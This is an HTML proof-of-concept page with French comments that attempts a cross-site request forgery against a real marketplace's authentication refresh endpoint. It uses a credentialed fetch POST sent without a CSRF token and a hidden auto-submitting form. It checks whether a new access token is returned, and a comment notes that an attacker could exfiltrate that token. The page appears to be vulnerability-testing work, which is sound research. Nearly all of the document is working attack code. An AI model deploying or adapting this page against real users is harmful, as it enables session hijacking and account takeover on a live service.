<!-- csrf_refresh.html -->
<!DOCTYPE html>
<html>
<body>
    <script>
        // Méthode 1 : Image (GET transformé en POST par le navigateur ?)
        // À tester : certains navigateur respectent la spec pour POST
        
        // Méthode 2 : Fetch avec credentials
        fetch('https://www.vinted.fr/web/api/auth/refresh', {
            method: 'POST',
            credentials: 'include',  // Envoie le refresh_token_web automatiquement
            headers: {
                'Content-Type': 'application/json',
                // PAS de X-Csrf-Token !
            },
            body: ''  // Body vide comme vous l'avez trouvé
        })
        .then(response => {
            console.log('Status:', response.status);
            console.log('Headers:', [...response.headers]);
            return response.text();
        })
        .then(text => {
            console.log('Réponse:', text);
            if (text.includes('access_token')) {
                alert('✅ CSRF Refresh réussi ! Nouveau token généré.');
                // Ici un vrai attaquant pourrait exfiltrer le token
            }
        })
        .catch(error => console.error('Erreur:', error));
        
        // Méthode 3 : Formulaire avec body vide
        const form = document.createElement('form');
        form.action = 'https://www.vinted.fr/web/api/auth/refresh';
        form.method = 'POST';
        form.target = '_blank';
        form.style.display = 'none';
        document.body.appendChild(form);
        form.submit();
    </script>
</body>
</html>
